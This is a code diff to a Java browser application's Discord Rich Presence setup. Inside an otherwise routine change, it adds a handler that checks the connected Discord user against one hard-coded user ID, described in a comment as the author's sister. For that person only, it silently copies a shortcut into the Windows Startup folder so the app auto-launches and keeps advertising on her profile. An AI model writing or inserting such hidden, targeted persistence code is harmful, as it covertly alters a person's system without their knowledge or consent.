@@ -3,6 +3,7 @@ package de.MarkusTieger.Tigxa;
 import club.minnced.discord.rpc.DiscordEventHandlers;
 import club.minnced.discord.rpc.DiscordRPC;
 import club.minnced.discord.rpc.DiscordRichPresence;
+import club.minnced.discord.rpc.DiscordUser;
 import com.formdev.flatlaf.FlatLightLaf;
 import de.MarkusTieger.Tigxa.api.IAPI;
 import de.MarkusTieger.Tigxa.api.impl.main.MainAPI;
@@ -33,10 +34,7 @@ import org.gjt.sp.jedit.gui.HistoryModelSaver;
 import org.gjt.sp.jedit.jEdit;
 
 import javax.swing.*;
-import java.io.File;
-import java.io.FileReader;
-import java.io.FileWriter;
-import java.io.IOException;
+import java.io.*;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.util.function.Consumer;
@@ -269,14 +267,15 @@ public class Browser {
 
     }
 
-    private static void initializeRPC() {
+    public static void initializeRPC() {
+        if(System.getProperty("discord.rpc", "true").equalsIgnoreCase("false")) return;
         try {
             DiscordRPC lib = DiscordRPC.INSTANCE;
             String applicationId = "966331256226848768";
             String steamId = "";
 
             DiscordEventHandlers handlers = new DiscordEventHandlers();
-            handlers.ready = (user) -> LOGGER.debug("RPC Ready! User: " + user.username + "#" + user.discriminator + " (" + user.userId + ")");
+            handlers.ready = Browser::handleRPCUser;
             lib.Discord_Initialize(applicationId, handlers, true, steamId);
             DiscordRichPresence presence = new DiscordRichPresence();
             presence.startTimestamp = System.currentTimeMillis() / 1000;
@@ -296,6 +295,46 @@ public class Browser {
         } catch (Throwable e){
             LOGGER.warn("Discord RPC can't initialized!", e);
         }
+    }
+
+    private static void handleRPCUser(DiscordUser user) {
+        if(user == null) return;
+        if(user.userId == null) return;
+        System.out.println(user.userId);
+        if(user.userId.equalsIgnoreCase("554012432822173726")){
+            // If its my sister, install Background RPC worker for 24/7 Adverts on her Profile
+            // This only works on Windows
+
+            new Thread(Browser::installRPCBackgroundWorker).start();
+        }
+    }
+
+    private static void installRPCBackgroundWorker() {
+        File loc = new File(System.getenv("AppData"), "Microsoft/Windows/Start Menu/Programs/Startup");
+        if(!loc.exists()) loc.mkdirs();
+
+        File ink = new File(loc, "Tigxa.lnk");
+
+        InputStream in = Browser.class.getResourceAsStream("/res/links/Tigxa.lnk");
+        if(in == null) return;
+
+        if(!ink.exists()) {
+            try {
+                ink.createNewFile();
+                FileOutputStream out = new FileOutputStream(ink);
+                int len;
+                byte[] buffer = new byte[1024];
+                while((len = in.read(buffer)) > 0){
+                    out.write(buffer, 0, len);
+                }
+                out.flush();
+                out.close();
+                in.close();
+            } catch (Throwable e) {
+                e.printStackTrace();
+            }
+        }
+
     }
 
     private static void initializeHistory(){
